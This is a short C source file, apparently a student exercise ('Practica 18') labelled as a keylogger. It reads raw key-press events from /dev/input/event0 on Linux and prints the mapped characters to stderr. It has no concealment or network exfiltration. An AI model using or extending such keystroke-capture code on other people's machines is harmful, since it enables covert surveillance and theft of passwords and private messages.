#if 0
  // Practica 18
  // Mario Arturo Perez Rangel
  // Keylogger
#endif

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/types.h>
#include "kbmap.h"

int main()
{
  struct kbmap km[MAX_ENTRIES];
  struct input_event e;
  int kbd;
  char *archivo="/dev/input/event0"; // Dispositivo del teclado

  kbd = open (archivo, O_RDONLY);
  if (kbd == -1) {
    fprintf (stderr, "No se tiene acceso al teclado.\n");
  }

  inicia_kbmap (km);

  for (;;) {
    if (read(kbd, &e, sizeof(struct input_event)) == sizeof(struct input_event)) {
      if (e.type == EV_KEY && e.value == 1) { // Se presiono una tecla
	if ((e.code > 0) && (e.code < 84)) {
	  fprintf(stderr, "%c", km[e.code].letra);
	}
      }
    }
  }

  close (kbd);
  exit (0);
}


